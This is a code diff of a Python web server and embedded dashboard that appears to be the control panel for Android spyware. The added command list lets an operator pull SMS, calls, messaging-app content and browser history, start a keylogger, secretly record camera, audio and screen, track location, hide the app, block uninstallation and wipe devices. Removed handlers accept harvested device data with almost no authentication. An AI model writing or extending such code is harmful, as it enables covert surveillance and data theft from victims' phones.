-    return await r.json();
-  }catch(e){console.error(e);return null}
-}
-async function apiPost(path,body){
-  localApiHits++;
-  try{
-    const r=await fetch(API+path,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
-    return await r.json();
-  }catch(e){return null}
-}
-async function apiDelete(path){
-  try{const r=await fetch(API+path,{method:'DELETE'});return await r.json()}catch(e){return null}
+function populateDeviceSelects(){
+const html=DEVICES.map(d=>`<option value="${d.id}">${d.name||d.id} (${d.active?'🟢':'🔴'})</option>`).join('');
+['cmdDevice','fileDevice','dataDevice','monDevice'].forEach(id=>{
+const el=document.getElementById(id);if(el)el.innerHTML=html;
+});
 }
 
-// ── Refresh ──
-async function refresh(){
-  try{
-    const [s,d,l,cmds,sess]=await Promise.all([
-      apiGet('/api/status'),
-      apiGet('/api/devices'),
-      apiGet('/api/logs?limit=50'),
-      apiGet('/api/commands?limit=30'),
-      apiGet('/api/sessions'),
-    ]);
-    if(!s)return;
-
-    // Stats
-    document.getElementById('sUptime').textContent=s.uptime||0;
-    const devs=d||[];
-    const online=devs.filter(x=>x.active).length;
-    document.getElementById('sDevices').textContent=devs.length;
-    document.getElementById('sOnline').textContent=online;
-    document.getElementById('sMessages').textContent=s.messages_sent||0;
-    const pendingCmds=(cmds||[]).filter(c=>c.status==='pending').length;
-    document.getElementById('sCommands').textContent=pendingCmds;
-    document.getElementById('sApiHits').textContent=localApiHits;
-
-    // Populate device selects
-    populateSelect('dataDeviceSelect',devs);
-    populateSelect('cmdDeviceSelect',devs);
-
-    // Home devices
-    const hd=document.getElementById('homeDevices');
-    hd.innerHTML=devs.slice(0,5).map(x=>`<tr><td>${x.name||'—'}</td><td><code>${x.id}</code></td><td><span class="badge ${x.active?'badge-success':'badge-danger'}">${x.active?'متصل':'غير متصل'}</span></td><td>${x.last_seen||'—'}</td></tr>`).join('');
-
-    // Home log
-    const logs=l||[];
-    const hl=document.getElementById('homeLog');
-    hl.innerHTML=logs.slice(-10).reverse().map(e=>{
-      const cls=e.level==='error'?'log-err':e.level==='warn'?'log-warn':'log-info';
-      return `<div class="log-entry ${cls}">[${e.time.slice(11,19)}] ${e.event}</div>`;
-    }).join('')||'<span class="log-info">لا توجد أحداث</span>';
-
-    // Devices page
-    const dt=document.getElementById('devicesTable');
-    const nd=document.getElementById('noDevices');
-    if(!devs.length){dt.innerHTML='';nd.style.display='block'}
-    else{nd.style.display='none';dt.innerHTML=devs.map(x=>`<tr>
-      <td>${x.name||'—'}</td><td><code>${x.id}</code></td><td>${x.model||'—'}</td>
-      <td>${x.battery||'—'}%</td>
-      <td><span class="badge ${x.active?'badge-success':'badge-danger'}">${x.active?'متصل':'غير متصل'}</span></td>
-      <td>${x.last_seen||'—'}</td>
-      <td><button class="btn btn-sm btn-primary" onclick="showDeviceModal('${x.id}')">&#x1F50D;</button>
-      <button class="btn btn-sm btn-danger" onclick="removeDevice('${x.id}')">&#x1F5D1;</button></td>
-    </tr>`).join('')}
-
-    // Logs page
-    const lc=document.getElementById('logContainer');
-    lc.innerHTML=logs.reverse().map(e=>{
-      const cls=e.level==='error'?'log-err':e.level==='warn'?'log-warn':e.level==='ok'?'log-ok':'log-info';
-      return `<div class="log-entry ${cls}">[${e.time}] ${e.event} ${e.details?JSON.stringify(e.details):''}</div>`;
-    }).join('')||'<span class="log-info">لا توجد أحداث</span>';
-
-    // Commands page
-    const ch=document.getElementById('cmdHistory');
-    ch.innerHTML=(cmds||[]).reverse().map(c=>{
-      const cls=c.status==='pending'?'log-warn':c.status==='completed'?'log-ok':'log-err';
-      return `<div class="log-entry ${cls}">[${c.created_at}] ${c.command} → ${c.device_id} (${c.status})</div>`;
-    }).join('')||'<span class="log-info">لا توجد أوامر</span>';
-
-    // Sessions page
-    const st=document.getElementById('sessionsTable');
-    st.innerHTML=(sess||[]).map(s=>`<tr>
-      <td>${s.username||'—'}</td><td><code>${s.token.slice(0,16)}...</code></td>
-      <td>${s.created_at||'—'}</td><td>${s.expires_at||'—'}</td>
-      <td><button class="btn btn-sm btn-danger" onclick="deleteSession('${s.token}')">&#x1F5D1;</button></td>
-    </tr>`).join('');
-
-    // Settings
-    loadSettings(s.settings||{});
-  }catch(e){console.error('Refresh error:',e)}
+async function loadAll(){
+try{const r=await api('web/stats');if(r.ok)renderStats(r.stats);}catch(e){}
+try{const r=await api('web/devices');if(r.ok){DEVICES=r.devices||[];populateDeviceSelects();renderDevices();}}catch(e){}
+try{const r=await api('web/commands');if(r.ok)renderCommandLog(r.commands);}catch(e){}
 }
 
-function populateSelect(id,devs){
-  const sel=document.getElementById(id);
-  if(!sel)return;
-  const val=sel.value;
-  sel.innerHTML='<option value="">-- اختر جهاز --</option>'+devs.map(d=>`<option value="${d.id}">${d.name||d.id}</option>`).join('');
-  if(val)sel.value=val;
+function renderStats(s){
+const grid=document.getElementById('statsGrid');
+grid.innerHTML=`
+<div class="stat-card"><div class="label">⏱ Uptime</div><div class="value">${s.uptime_formatted||'-'}</div></div>
+<div class="stat-card"><div class="label">📱 Devices</div><div class="value" style="color:var(--blue)">${s.devices_total}</div><div class="sub">🟢 ${s.devices_online} online</div></div>
+<div class="stat-card"><div class="label">📋 Commands</div><div class="value" style="color:var(--yellow)">${s.total_registered_commands}</div><div class="sub">⏳ ${s.commands_pending} pending</div></div>
+<div class="stat-card"><div class="label">📨 Messages</div><div class="value" style="color:var(--purple)">${s.messages_sent}</div></div>
+<div class="stat-card"><div class="label">📡 API</div><div class="value">${s.api_hits}</div><div class="sub">hits</div></div>
+<div class="stat-card"><div class="label">✅ Completed</div><div class="value" style="color:var(--green)">${s.commands_completed}</div></div>`;
 }
 
-// ── Device actions ──
-async function removeDevice(id){if(!confirm('هل أنت متأكد من حذف هذا الجهاز؟'))return;await apiDelete('/api/devices/'+id);refresh()}
-
-async function showDeviceModal(id){
-  const devs=await apiGet('/api/devices');
-  const d=(devs||[]).find(x=>x.id===id);
-  if(!d)return;
-  let html=`<h3>&#x1F4F1; ${d.name||d.id}</h3>
-  <table class="data-table"><tbody>
-  <tr><td><b>المعرف</b></td><td><code>${d.id}</code></td></tr>
-  <tr><td><b>الموديل</b></td><td>${d.model||'—'}</td></tr>
-  <tr><td><b>النظام</b></td><td>${d.os||'—'}</td></tr>
-  <tr><td><b>البطارية</b></td><td>${d.battery||'—'}%</td></tr>
-  <tr><td><b>الشبكة</b></td><td>${d.network||'—'}</td></tr>
-  <tr><td><b>الحالة</b></td><td><span class="badge ${d.active?'badge-success':'badge-danger'}">${d.active?'متصل':'غير متصل'}</span></td></tr>
-  <tr><td><b>آخر نشاط</b></td><td>${d.last_seen||'—'}</td></tr>
-  </tbody></table>`;
-  showModal(html);
+function renderDevices(){
+const el=document.getElementById('deviceList');
+const dash=document.getElementById('dashDevices');
+if(!DEVICES.length){
+el.innerHTML='<div class="empty">No devices linked</div>';
+dash.innerHTML='<div class="empty">No devices</div>';
+return;
+}
+const card=d=>`
+<div class="device-card" onclick="showDeviceDetail('${d.id}')">
+<div class="name">${d.active?'🟢':'🔴'} ${d.name||d.id}</div>
+<div class="meta">Model: ${d.model||'-'} | OS: ${d.os||'-'}</div>
+<div class="meta">Battery: ${d.battery||'-'}% | Last: ${d.last_seen||'-'}</div>
+</div>`;
+el.innerHTML=DEVICES.map(card).join('');
+dash.innerHTML=DEVICES.slice(0,4).map(card).join('');
 }
 
-// ── Map ──
-async function loadMap(){
-  const devs=await apiGet('/api/devices');
-  const locs=(devs||[]).filter(d=>d.lat&&d.lng);
-  const mc=document.getElementById('mapContainer');
-  if(!locs.length){mc.innerHTML='<span>&#x1F4CD; لا توجد مواقع متاحة للأجهزة</span>';return}
-  let markers='';
-  locs.forEach(d=>{markers+=`<marker name="${d.name||d.id}" lat="${d.lat}" lng="${d.lng}"/>`});
-  mc.innerHTML=`<iframe src="https://www.openstreetmap.org/export/embed.html?bbox=${Math.min(...locs.map(d=>parseFloat(d.lng)))-0.01},${Math.min(...locs.map(d=>parseFloat(d.lat)))-0.01},${Math.max(...locs.map(d=>parseFloat(d.lng)))+0.01},${Math.max(...locs.map(d=>parseFloat(d.lat)))+0.01}&layer=mapnik&marker=${locs[0].lat},${locs[0].lng}" loading="lazy"></iframe>`;
+async function showDeviceDetail(id){
+try{
+const r=await api('web/device/'+id);
+if(!r.ok)return;
+const d=r.device;const cmds=r.commands||[];
+const detail=document.getElementById('deviceDetail');
+detail.style.display='block';
+detail.innerHTML=`
+<h2>📱 ${d.name||d.id}</h2>
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:16px 0">
+<div><span style="color:var(--text2)">ID:</span> <code>${d.id}</code></div>
+<div><span style="color:var(--text2)">Status:</span> ${d.active?'<span class="badge badge-green">Online</span>':'<span class="badge badge-red">Offline</span>'}</div>
+<div><span style="color:var(--text2)">Model:</span> ${d.model||'-'}</div>
+<div><span style="color:var(--text2)">OS:</span> ${d.os||'-'}</div>
+<div><span style="color:var(--text2)">Battery:</span> ${d.battery||'-'}%</div>
+<div><span style="color:var(--text2)">Network:</span> ${d.network||'-'}</div>
+<div><span style="color:var(--text2)">Location:</span> ${d.location||'-'}</div>
+<div><span style="color:var(--text2)">Last Seen:</span> ${d.last_seen||'-'}</div>
+</div>
+<h3>📋 Recent Commands</h3>
+${cmds.length?cmds.map(c=>`<div class="cmd-item"><div class="cmd-header"><span>${c.command}</span><span class="badge badge-${c.status==='completed'?'green':c.status==='pending'?'yellow':'blue'}">${c.status}</span></div><div style="color:var(--text2);font-size:12px">${c.created_at} | ID: ${c.id}</div></div>`).join(''):'<div class="empty">No commands</div>'}
+<button class="btn btn-danger btn-sm" onclick="unlinkDevice('${d.id}')" style="margin-top:16px">🗑️ Unlink Device</button>`;
+detail.scrollIntoView({behavior:'smooth'});
+}catch(e){}
 }
 
-// ── Data viewer ──
-async function showDataTab(type){
-  document.querySelectorAll('.tab').forEach(t=>t.classList.toggle('active',t.dataset.tab===type));
-  const devId=document.getElementById('dataDeviceSelect').value;
-  if(!devId){document.getElementById('dataContent').innerHTML='<span class="log-info">اختر جهازاً أولاً</span>';return}
-  const data=await apiGet('/api/devices/'+devId+'/data/'+type);
-  const dc=document.getElementById('dataContent');
-  if(!data||data.error){dc.innerHTML='<span class="log-err">لا توجد بيانات متاحة</span>';return}
-  if(Array.isArray(data)){dc.innerHTML=data.map((item,i)=>`<div class="log-entry log-info">${JSON.stringify(item)}</div>`).join('')||'<span class="log-info">لا توجد بيانات</span>'}
-  else{dc.innerHTML=`<pre style="white-space:pre-wrap">${JSON.stringify(data,null,2)}</pre>`}
+async function unlinkDevice(id){
+if(!confirm('Unlink this device?'))return;
+const r=await api('web/unlink/'+id,{method:'DELETE'});
+if(r.ok){notify('Device unlinked');loadAll();}
+else notify('Failed','var(--accent)');
 }
 
-// ── Command center ──
-async function sendCommand(){
-  const devId=document.getElementById('cmdDeviceSelect').value;
-  const cmd=document.getElementById('cmdSelect').value;
-  if(!devId){alert('اختر جهازاً أولاً');return}
-  const result=await apiPost('/api/devices/'+devId+'/command',{command:cmd});
-  if(result&&result.ok)alert('✅ تم إرسال الأمر');
-  refresh();
+async function generateLink(){
+const r=await api('web/link_code');
+if(r.ok){
+const box=document.getElementById('linkCodeBox');
+document.getElementById('linkCodeText').textContent=r.code;
+box.style.display='block';
+notify('Link code generated!');
+}
 }
 
-// ── Settings ──
-function loadSettings(s){
-  document.getElementById('setSyncInterval').value=s.sync_interval||300;
-  document.getElementById('setLocInterval').value=s.location_interval||60;
-  setToggle('toggleAutoLoc',s.auto_location);
-  setToggle('toggleAutoSync',s.auto_sync);
-  setToggle('toggleNotify',s.notifications);
-  setToggle('toggleKeylog',s.keylogger);
-  setToggle('toggleSim',s.sim_detect);
-  setToggle('toggleWifi',s.wifi_monitor);
-}
-function setToggle(id,val){const el=document.getElementById(id);if(el){el.classList.toggle('on',!!val)}}
-async function updateSetting(key,val){
-  await apiPost('/api/settings',{[key]:parseInt(val)||val});
-}
-async function toggleSetting(key){
-  const s=await apiGet('/api/settings');
-  if(!s)return;
-  s[key]=!s[key];
-  await apiPost('/api/settings',s);
-  refresh();
+const CMD_CATEGORIES={
+data:{label:'📊 Data',cmds:['sms','calls','contacts','location','notifications','apps','info','battery','gallery','clipboard','all_data','wifi_info','bluetooth_devices','network_info','sim_info','storage_info','installed_apps','running_apps','calendar','browser_history']},
+social:{label:'🌐 Social',cmds:['whatsapp','telegram_app','instagram','messenger','snapchat','tiktok','twitter','viber','signal','facebook','whatsapp_status','whatsapp_stories','telegram_channels','instagram_stories','youtube']},
+control:{label:'🎮 Control',cmds:['ping','vibrate','ring','screenshot','front_camera','back_camera','record_audio','record_video','lock_phone','unlock_phone','reboot','shutdown','set_volume','set_brightness','enable_wifi','disable_wifi','enable_bluetooth','disable_bluetooth','enable_mobile_data','disable_mobile_data','enable_hotspot','disable_hotspot','airplane_on','airplane_off','torch_on','torch_off','play_sound','speak_text','open_url','send_sms','make_call','block_number','unblock_number']},
+apps:{label:'📦 Apps',cmds:['open_app','close_app','install_app','uninstall_app','block_app','unblock_app','clear_app_data','force_stop_app','app_info','app_usage','screen_time','app_permissions','enable_app','disable_app','list_blocked','clear_cache','update_app','launch_app','kill_app','app_cache']},
+files:{label:'📂 Files',cmds:['list_files','get_file','download_file','list_downloads','list_dcim','list_music','list_videos','list_documents','list_whatsapp','list_telegram_files','send_contacts_backup','send_sms_backup','send_calls_backup','send_full_backup','delete_file','rename_file','copy_file','move_file','create_folder','search_files','recent_files','file_info','zip_files']},
+security:{label:'🔒 Security',cmds:['wipe_data','factory_reset','show_app','hide_app','change_passcode','set_pin','remove_pin','enable_biometric','disable_biometric','anti_uninstall_on','anti_uninstall_off','device_admin_status','check_root','set_screen_lock','remove_screen_lock']},
+monitor:{label:'🔍 Monitor',cmds:['keylogger_start','keylogger_stop','get_keylogger','screen_record_start','screen_record_stop','clipboard_monitor_start','clipboard_monitor_stop','get_clipboard_log','wifi_monitor_start','wifi_monitor_stop','app_monitor_start','app_monitor_stop','get_app_log','location_live','location_stop','location_history','geo_add','geo_remove','geo_list','sms_monitor','call_monitor']},
+syssettings:{label:'⚙️ System',cmds:['set_language','set_timezone','set_alarm','set_timer','set_reminder','enable_dev_mode','disable_dev_mode','enable_usb_debug','disable_usb_debug','dns_change','proxy_set','apn_settings','nfc_on','nfc_off','auto_update_on','auto_update_off']}
+};
+
+function initCmdTabs(){
+const tabs=document.getElementById('cmdTabs');
+tabs.innerHTML=Object.keys(CMD_CATEGORIES).map(k=>`<button class="tab${k==='data'?' active':''}" onclick="showCmdCat('${k}',this)">${CMD_CATEGORIES[k].label}</button>`).join('');
+showCmdCat('data');
 }
 
-// ── Export ──
-async function exportData(fmt){
-  const a=document.createElement('a');
-  const devs=await apiGet('/api/devices');
-  if(fmt==='csv'){
-    if(!devs||!devs.length)return;
-    let csv=Object.keys(devs[0]).join(',')+'\n';
-    devs.forEach(d=>csv+=Object.values(d).map(v=>String(v||'').replace(/,/g,';')).join(',')+'\n');
-    a.href='data:text/csv;charset=utf-8,'+encodeURIComponent('\uFEFF'+csv);
-    a.download='devices_export.csv';
-  }else{
-    a.href='data:application/json;charset=utf-8,'+encodeURIComponent(JSON.stringify(devs||[],null,2));
-    a.download='devices_export.json';
-  }
-  a.click();
+function showCmdCat(cat,btn){
+if(btn){document.querySelectorAll('#cmdTabs .tab').forEach(t=>t.classList.remove('active'));btn.classList.add('active');}
+const grid=document.getElementById('cmdGrid');
+grid.innerHTML=CMD_CATEGORIES[cat].cmds.map(c=>`<button class="cmd-btn" onclick="sendDeviceCmd('${c}')">${c.replace(/_/g,' ')}</button>`).join('');
 }
 
-async function createBackup(){
-  const r=await apiPost('/api/backup',{});
-  if(r&&r.ok)alert('✅ تم إنشاء النسخة الاحتياطية: '+r.file);
+async function sendDeviceCmd(cmd){
+const devId=document.getElementById('cmdDevice').value;
+if(!devId){notify('Select a device','var(--accent)');return;}
+const r=await api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:cmd})});
+if(r.ok)notify('Command sent!');else notify('Failed','var(--accent)');
+loadAll();
 }
 
-// ── Sessions ──
-async function deleteSession(token){await apiDelete('/api/sessions/'+token);refresh()}
-async function clearLogs(){if(!confirm('مسح جميع الأحداث؟'))return;await apiPost('/api/logs/clear',{});refresh()}
-
-// ── Modal ──
-function showModal(html){
-  let m=document.getElementById('modal');
-  if(!m){m=document.createElement('div');m.id='modal';m.className='modal-overlay';document.body.appendChild(m)}
-  m.innerHTML=`<div class="modal"><button class="modal-close" onclick="closeModal()">&times;</button>${html}</div>`;
-  m.classList.add('show');
+function sendCmd(cmd){
+const devId=document.getElementById('fileDevice').value;
+if(!devId){notify('Select a device','var(--accent)');return;}
+api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:cmd})}).then(r=>{
+if(r.ok)notify('Command sent!');else notify('Failed','var(--accent)');
+});
 }
-function closeModal(){const m=document.getElementById('modal');if(m)m.classList.remove('show')}
+function sendDataCmd(cmd){
+const devId=document.getElementById('dataDevice').value;
+if(!devId){notify('Select a device','var(--accent)');return;}
+api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:'get_'+cmd})}).then(r=>{
+if(r.ok)notify('Command sent!');else notify('Failed','var(--accent)');
+});
+}
+function sendMonCmd(cmd){
+const devId=document.getElementById('monDevice').value;
+if(!devId){notify('Select a device','var(--accent)');return;}
+api('web/send_command',{method:'POST',body:JSON.stringify({device_id:devId,command:cmd})}).then(r=>{
+if(r.ok)notify('Command sent!');else notify('Failed','var(--accent)');
+});
+}
 
-// ── Init ──
-document.getElementById('loginPass').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin()});
-checkSession();
+function renderCommandLog(cmds){
+const el=document.getElementById('cmdLog');
+const dash=document.getElementById('dashCommands');
+const items=(cmds||[]).slice(-20).reverse();
+if(!items.length){el.innerHTML='<div class="empty">No commands</div>';dash.innerHTML='';return;}
+const html=items.map(c=>`<div class="cmd-item"><div class="cmd-header"><span>${c.command}</span><span class="badge badge-${c.status==='completed'?'green':c.status==='pending'?'yellow':'blue'}">${c.status}</span></div><div style="color:var(--text2);font-size:12px">Device: ${c.device_id} | ${c.created_at}</div></div>`).join('');
+el.innerHTML=html;
+dash.innerHTML=html;
+}
+
+async function loadEvents(){
+const r=await api('web/events');
+if(r.ok){
+const el=document.getElementById('eventLog');
+el.innerHTML=(r.events||[]).slice(-50).reverse().map(e=>`<div class="log-item"><span class="time">${(e.time||'').slice(0,19)}</span><span class="event">${e.event} ${e.details?JSON.stringify(e.details).slice(0,60):''}</span></div>`).join('')||'<div class="empty">No events</div>';
+}
+}
+
+async function loadSettings(){
+const r=await api('web/settings');
+if(r.ok){
+const s=r.settings;
+document.getElementById('settingsForm').innerHTML=`
+<label style="display:block;margin-bottom:12px">🔑 Admin Password<input id="setPass" value="${s.admin_password||'admin'}" style="display:block;width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px"></label>
+<label style="display:block;margin-bottom:12px">⏱️ Sync Interval (sec)<input id="setSync" type="number" value="${s.sync_interval||300}" style="display:block;width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px"></label>
+<label style="display:block;margin-bottom:12px">📍 Location Interval (sec)<input id="setLoc" type="number" value="${s.location_interval||60}" style="display:block;width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px"></label>
+<label style="display:block;margin-bottom:12px">🌐 Language<select id="setLang" style="display:block;width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);background:var(--bg);color:var(--text);margin-top:4px"><option value="ar" ${s.language==='ar'?'selected':''}>Arabic</option><option value="en" ${s.language==='en'?'selected':''}>English</option></select></label>
+<label style="display:flex;align-items:center;gap:8px;margin-bottom:12px"><input type="checkbox" id="setNotif" ${s.notifications?'checked':''}> 🔔 Notifications</label>
+<label style="display:flex;align-items:center;gap:8px;margin-bottom:12px"><input type="checkbox" id="setAutoLoc" ${s.auto_location?'checked':''}> 🗺️ Auto Location</label>
+<label style="display:flex;align-items:center;gap:8px;margin-bottom:12px"><input type="checkbox" id="setAutoSync" ${s.auto_sync?'checked':''}> 🔄 Auto Sync</label>`;
+}
+}
+
+async function saveSettings(){
+const data={
+admin_password:document.getElementById('setPass').value,
+sync_interval:parseInt(document.getElementById('setSync').value),
+location_interval:parseInt(document.getElementById('setLoc').value),
+language:document.getElementById('setLang').value,
+notifications:document.getElementById('setNotif').checked,
+auto_location:document.getElementById('setAutoLoc').checked,
+auto_sync:document.getElementById('setAutoSync').checked,
+};
+const r=await api('web/settings',{method:'PUT',body:JSON.stringify(data)});
+if(r.ok)notify('Settings saved!');else notify('Failed','var(--accent)');
+}
+
+if(TOKEN){showApp();}
+initCmdTabs();
+setTimeout(loadSettings,500);
 </script>
 </body>
 </html>"""
 
+# ============================================================================
+# WEB DASHBOARD ROUTE
+# ============================================================================
 
-# ═══════════════════════════════════════════════════════════════════════════════
-# REST API Handlers
-# ═══════════════════════════════════════════════════════════════════════════════
-
-async def handle_index(request: web.Request) -> web.Response:
+async def serve_dashboard(request):
     return web.Response(text=DASHBOARD_HTML, content_type="text/html", charset="utf-8")
 
+# ============================================================================
+# GETUPDATES POLLING
+# ============================================================================
 
-async def handle_health(request: web.Request) -> web.Response:
-    return web.json_response({"alive": True, "ts": ts(), "uptime": uptime()})
-
-
-def require_auth(handler):
-    """Decorator to require valid session for API endpoints."""
-    async def wrapper(request: web.Request):
-        token = request.query.get("token") or request.headers.get("X-Session-Token", "")
-        if not token:
-            token = request.cookies.get("az_session", "")
-        session = validate_session(token)
-        if not session:
-            return web.json_response({"error": "غير مصرح"}, status=401)
-        request["session"] = session
-        return await handler(request)
-    return wrapper
-
-
-@require_auth
-async def handle_api_status(request: web.Request) -> web.Response:
-    devices = get_devices()
-    online = sum(1 for d in devices if d.get("active"))
-    commands = load_json(COMMANDS_FILE, [])
-    pending = sum(1 for c in commands if c.get("status") == "pending")
-    settings = load_settings()
-    return web.json_response({
-        "bot_username": "Abu_Zahra_Bot",
-        "status": "running",
-        "uptime": uptime(),
-        "uptime_formatted": format_uptime(uptime()),
-        "messages_sent": messages_sent,
-        "server_time": ts(),
-        "port": SERVER_PORT,
-        "devices_total": len(devices),
-        "devices_online": online,
-        "commands_pending": pending,
-        "settings": settings,
-    })
-
-
-@require_auth
-async def handle_api_devices(request: web.Request) -> web.Response:
-    devices = get_devices()
-    return web.json_response(devices)
-
-
-@require_auth
-async def handle_api_add_device(request: web.Request) -> web.Response:
-    body = await request.json()
-    device_id = body.get("id", f"dev_{secrets.token_hex(4)}")
-    link_code = body.get("link_code", "")
-    settings = load_settings()
-
-    # Validate link code if provided
-    if link_code:
-        stored_code = settings.get("link_code", "")
-        expires = settings.get("link_code_expires", "")
-        if link_code != stored_code:
-            return web.json_response({"ok": False, "error": "كود الربط غير صحيح"}, status=400)
-        if expires:
-            try:
-                exp_time = datetime.fromisoformat(expires).replace(tzinfo=timezone.utc)
-                if datetime.now(timezone.utc) > exp_time:
-                    return web.json_response({"ok": False, "error": "انتهت صلاحية الكود"}, status=400)
-            except Exception:
-                pass
-        settings["link_code"] = ""
-        settings["link_code_expires"] = ""
-        save_settings(settings)
-        append_event("ربط جهاز بالكود", {"device_id": device_id, "code": link_code})
-
-    device = {
-        "id": device_id,
-        "name": body.get("name", ""),
-        "model": body.get("model", ""),
-        "os": body.get("os", ""),
-        "battery": body.get("battery", 0),
-        "network": body.get("network", ""),
-        "lat": body.get("lat"),
-        "lng": body.get("lng"),
-        "active": True,
-        "extra": body.get("extra", {}),
-    }
-    result = add_device(device)
-    return web.json_response({"ok": True, "device": result}, status=201)
-
-
-@require_auth
-async def handle_api_delete_device(request: web.Request) -> web.Response:
-    device_id = request.match_info["device_id"]
-    if remove_device(device_id):
-        return web.json_response({"ok": True})
-    return web.json_response({"ok": False, "error": "الجهاز غير موجود"}, status=404)
-
-
-@require_auth
-async def handle_api_device_command(request: web.Request) -> web.Response:
-    device_id = request.match_info["device_id"]
-    body = await request.json()
-    command = body.get("command", "")
-    if not command:
-        return web.json_response({"ok": False, "error": "الأمر مطلوب"}, status=400)
-    d = find_device(device_id)
-    if not d:
-        return web.json_response({"ok": False, "error": "الجهاز غير موجود"}, status=404)
-    params = body.get("params", {})
-    cmd = queue_command(device_id, command, params)
-    append_event("إرسال أمر عبر API", {"device_id": device_id, "command": command})
-    return web.json_response({"ok": True, "command": cmd})
-
-
-@require_auth
-async def handle_api_device_data(request: web.Request) -> web.Response:
-    device_id = request.match_info["device_id"]
-    data_type = request.match_info["data_type"]
-    d = find_device(device_id)
-    if not d:
-        return web.json_response({"error": "الجهاز غير موجود"}, status=404)
-
-    # Return device's stored data for the requested type
-    data = d.get("data", {}).get(data_type, [])
-    if not data and data_type in d:
-        data = d[data_type]
-    return web.json_response(data if data else {"error": "لا توجد بيانات"})
-
-
-@require_auth
-async def handle_api_sessions(request: web.Request) -> web.Response:
-    cleanup_expired_sessions()
-    sessions = get_sessions()
-    # Mask tokens for security
-    safe_sessions = []
-    for s in sessions:
-        safe = {**s}
-        safe_sessions.append(safe)
-    return web.json_response(safe_sessions)
-
-
-async def handle_api_create_session(request: web.Request) -> web.Response:
-    body = await request.json()
-    username = body.get("username", "")
-    password = body.get("password", "")
-    if not username or not password:
-        return web.json_response({"ok": False, "error": "اسم المستخدم وكلمة المرور مطلوبان"}, status=400)
-    session = create_session(username, password)
-    if not session:
-        return web.json_response({"ok": False, "error": "بيانات الدخول غير صحيحة"}, status=401)
-    response = web.json_response({"ok": True, "token": session["token"]})
-    response.set_cookie("az_session", session["token"], max_age=86400, httponly=True)
-    return response
-
-
-@require_auth
-async def handle_api_delete_session(request: web.Request) -> web.Response:
-    token = request.match_info["session_id"]
-    delete_session(token)
-    return web.json_response({"ok": True})
-
-
-@require_auth
-async def handle_api_logs(request: web.Request) -> web.Response:
-    events = load_json(EVENTS_FILE, [])
-    limit = int(request.query.get("limit", "50"))
-    return web.json_response(events[-limit:])
-
-
-@require_auth
-async def handle_api_clear_logs(request: web.Request) -> web.Response:
-    save_json(EVENTS_FILE, [])
-    append_event("مسح سجل الأحداث", {"source": "dashboard"})
-    return web.json_response({"ok": True})
-
-
-@require_auth
-async def handle_api_commands(request: web.Request) -> web.Response:
-    commands = load_json(COMMANDS_FILE, [])
-    limit = int(request.query.get("limit", "50"))
-    return web.json_response(commands[-limit:])
-
-
-@require_auth
-async def handle_api_stats(request: web.Request) -> web.Response:
-    devices = get_devices()
-    online = sum(1 for d in devices if d.get("active"))
-    events = load_json(EVENTS_FILE, [])
-    commands = load_json(COMMANDS_FILE, [])
-    return web.json_response({
-        "uptime": uptime(),
-        "devices_total": len(devices),
-        "devices_online": online,
-        "messages_sent": messages_sent,
-        "events_count": len(events),
-        "commands_pending": sum(1 for c in commands if c.get("status") == "pending"),
-        "commands_completed": sum(1 for c in commands if c.get("status") == "completed"),
-        "commands_failed": sum(1 for c in commands if c.get("status") == "failed"),
-    })
-
-
-@require_auth
-async def handle_api_export(request: web.Request) -> web.Response:
-    body = await request.json()
-    device_id = body.get("device_id", "all")
-    fmt = body.get("format", "json")
-    devices = get_devices()
-    if device_id and device_id != "all":
-        devices = [d for d in devices if d["id"] == device_id]
-
-    if fmt == "csv":
-        if not devices:
-            return web.json_response({"error": "لا توجد بيانات"}, status=404)
-        output = StringIO()
-        headers = list(devices[0].keys())
-        output.write(",".join(headers) + "\n")
-        for d in devices:
-            output.write(",".join(str(d.get(h, "")) for h in headers) + "\n")
-        content = output.getvalue()
-        return web.Response(text=content, content_type="text/csv", charset="utf-8")
-    else:
-        return web.json_response(devices)
-
-
-@require_auth
-async def handle_api_backup(request: web.Request) -> web.Response:
-    devices = get_devices()
-    events = load_json(EVENTS_FILE, [])
-    settings = load_settings()
-    commands = load_json(COMMANDS_FILE, [])
-    backup = {
-        "timestamp": ts(),
-        "devices": devices,
-        "events": events[-200:],
-        "settings": settings,
-        "commands": commands[-100:],
-    }
-    filename = f"backup_{int(time.time())}.json"
-    filepath = DATA_DIR / filename
-    save_json(filepath, backup)
-    append_event("إنشاء نسخة احتياطية", {"file": filename, "source": "dashboard"})
-    return web.json_response({"ok": True, "file": filename})
-
-
-@require_auth
-async def handle_api_settings_get(request: web.Request) -> web.Response:
-    settings = load_settings()
-    return web.json_response(settings)
-
-
-@require_auth
-async def handle_api_settings_update(request: web.Request) -> web.Response:
-    body = await request.json()
-    settings = load_settings()
-    for key, value in body.items():
-        if key in settings:
-            settings[key] = value
-    save_settings(settings)
-    append_event("تحديث الإعدادات", {"keys": list(body.keys())})
-    return web.json_response({"ok": True, "settings": settings})
-
-
-# Device data upload endpoint (for Android app to push data)
-async def handle_api_device_upload(request: web.Request) -> web.Request:
-    device_id = request.match_info["device_id"]
-    body = await request.json()
-    auth_key = request.headers.get("X-Device-Key", "")
-    if not auth_key:
-        return web.json_response({"error": "مفتاح الجهاز مطلوب"}, status=401)
-
-    devices = get_devices()
-    for i, d in enumerate(devices):
-        if d.get("id") == device_id:
-            d.update(body)
-            d["last_seen"] = ts()
-            d["active"] = True
-            devices[i] = d
-            save_devices(devices)
-            append_event("تحديث بيانات الجهاز", {"id": device_id})
-            return web.json_response({"ok": True})
-
-    return web.json_response({"error": "الجهاز غير مسجل"}, status=404)
-
-
-# Get pending commands for a device
-async def handle_api_device_pending_commands(request: web.Request) -> web.Response:
-    device_id = request.match_info["device_id"]
-    auth_key = request.headers.get("X-Device-Key", "")
-    if not auth_key:
-        return web.json_response({"error": "مفتاح الجهاز مطلوب"}, status=401)
-    pending = get_pending_commands(device_id)
-    # Mark as sent
